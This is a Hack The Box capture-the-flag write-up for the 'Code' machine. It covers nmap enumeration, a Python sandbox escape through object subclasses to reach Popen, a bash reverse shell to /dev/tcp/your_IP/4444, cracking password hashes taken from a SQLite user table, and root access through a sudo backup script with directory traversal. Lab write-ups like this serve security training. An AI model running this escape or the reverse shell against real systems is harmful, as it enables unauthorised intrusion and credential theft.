# Write Up for The HTB Code Box

## Enumeration

Launching into the Box my IP was `10.10.11.62`

Using Nmap I will Scan the Ip for open Ports `nmap -sC -sV -T4 <ip>`

<img width="823" height="302" alt="codenmap" src="https://github.com/user-attachments/assets/36c801b6-5cd0-44a4-bd8c-43fda50e19ad" />

Http webside on port 5000. Looking at the website it sanitises the inputs you give it.

# Exploitation

On a meduim Writeup I saw you can display exceptions! So i try `print((()).__class__.__bases__[0].__subclasses__())` I see alot of classes and need the Popen one to spawn a shell. 

I used microsoft word as a find tool and got `raise Exception((()).__class__.__bases__[0].__subclasses__()[317].__name__)` perfect!

<img width="973" height="61" alt="popen" src="https://github.com/user-attachments/assets/426198a4-6ba7-4839-a9f2-eb5ec728126d" />

Write a shell to get in `raise Exception(str((()) .__class__.__bases__[0].__subclasses__()[317]("bash -c 'bash -i >& /dev/tcp/your_IP/4444 0>&1'", shell=True, stdout=-1).communicate()))`

After that got my shell as app-prodution. Looking for files to write to I find a data base .db hmmm `cd instance sqlite3 database.db.tables SELECT * FROM USER;`

<img width="469" height="156" alt="sqlicode" src="https://github.com/user-attachments/assets/e29e2a98-e7c3-46bf-9bb5-5260357dd3df" />

I used Crackstation to then find martins password and logged in via ssh 

# Root Flag

Next I used `sudo -l` to see any commands that can be run 

<img width="793" height="141" alt="sudocode" src="https://github.com/user-attachments/assets/7b23ef0a-2501-4617-9c41-9ec17b2e8f1d" />

Looking into the file its a backup file that uses task.json which just backups any directory

I tried to get it to back up the root directoy but that failed so I looked up directory traversial methods and got my answer.

I modified the task.json file and ran it

<img width="610" height="194" alt="task" src="https://github.com/user-attachments/assets/b2fbca72-f321-4e22-a135-441d99263b05" />

Unzip the folder and go into the root and the `root.txt` flag is there

<img width="803" height="75" alt="rootflagcode" src="https://github.com/user-attachments/assets/4ac8c299-2cee-4eff-bc1e-59b0962e009f" />
